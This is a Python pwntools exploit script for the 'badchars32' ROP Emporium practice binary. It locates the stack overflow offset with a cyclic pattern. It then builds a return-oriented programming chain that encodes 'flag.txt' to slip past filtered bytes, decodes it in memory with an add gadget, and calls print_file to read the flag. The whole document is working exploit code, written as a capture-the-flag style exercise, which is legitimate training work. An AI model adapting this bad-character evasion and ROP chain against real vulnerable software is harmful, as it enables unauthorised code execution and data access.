from pwn import *
#context.log_level = 'DEBUG'
elf = ELF('./badchars32')
p = process('./badchars32')

# find offset
g = cyclic_gen()
t = g.get(100)
p.recvuntil(b'>')
p.sendline(t)
p.recvall()
eip = b'\x61\x61\x61\x6c'
eip = hex(unpack(eip))
eip = bytes.fromhex(eip[2:]).decode()
offset = g.find(eip)[0]
log.info(f'offset: {offset}')
p.close()

# exploit
# [!!!] badchars 0x78(x) 0x67(g) 0x61(a) 0x2e(.)
base_string_addr = 0x0804a020
string_addr0 = pack(base_string_addr, 32, 'little')
string_addr1 = pack(base_string_addr+4, 32, 'little')
add_ebp = pack(elf.sym['usefulGadgets'], 32, 'little') # add [ebp], bl
pop_ebp = pack(0x080485bb, 32, 'little') # pop ebp ; ret
pop_ebx = pack(0x0804839d, 32, 'little') # pop ebx ; ret
pop_edi = pack(0x080485b9, 32, 'little') # : pop esi ; pop edi ; pop ebp ; ret
mov_edi = pack(0x0804854f, 32, 'little') # mov dword ptr [edi], esi ; ret
print_file = pack(elf.sym['print_file'], 32, 'little')

## encode_func
def en(r):
    d = b''
    for b in r:
        d += bytes([b-1])
    return d

def add_ebp_payload():
    add_payload = [
        pop_ebx,
        pack(0x1, 32, 'little'),
    ]
    for i in range(0,8):
        add_payload.append(pop_ebp)
        string_addr = pack(base_string_addr + i, 32, 'little')
        add_payload.append(string_addr)
        add_payload.append(add_ebp)
    return b''.join(add_payload)

payload = [
        b'A' * offset,
        pop_edi,
        en(b'flag'),
        string_addr0,
        string_addr0,
        mov_edi,
        pop_edi,
        en(b'.txt'),
        string_addr1,
        string_addr1,
        mov_edi,
        add_ebp_payload(),
        print_file,
        b'BBBB',
        string_addr0
    ]

payload = b''.join(payload)
rop = ROP('./badchars32')
rop.raw(payload)
log.info(f"payload:\n{rop.dump()}")
p = process('./badchars32')
p.recvuntil(b'>')
# gdb.attach('badchars32', gdbscript = 'b *pwnme+273') I fix this, and it is very useful!!!!!
payload = p.sendline(payload)
p.recvline()
log.success(f'{p.recvline().decode()}')
